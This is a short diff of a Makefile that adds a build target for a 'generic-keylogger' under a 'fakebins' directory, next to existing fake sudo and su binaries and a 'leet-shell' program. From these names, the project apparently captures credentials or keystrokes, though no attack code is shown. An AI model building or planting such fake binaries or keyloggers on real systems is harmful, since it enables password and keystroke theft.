@@ -33,10 +33,12 @@ sudo: .obj/libtas.a
 su: .obj/libtas.a
 	@$(MAKE) -C fakebins/su
 
+generic-keylogger: .obj/libtas.a
+	@$(MAKE) -C fakebins/generic-keylogger
+
 fun/leet-shell: fun/leet-shell.c .obj/libtas.a
 	@echo "  CC $@"
 	@$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $^ -static -lutil
 
 clean:
-	rm -f $(OBJS) sudo su fun/leet-shell \
-	 fakebins/sudo/config.h fakebins/su/config.h
+	rm -f $(OBJS) sudo su generic-keylogger fun/leet-shell fakebins/*/config.h
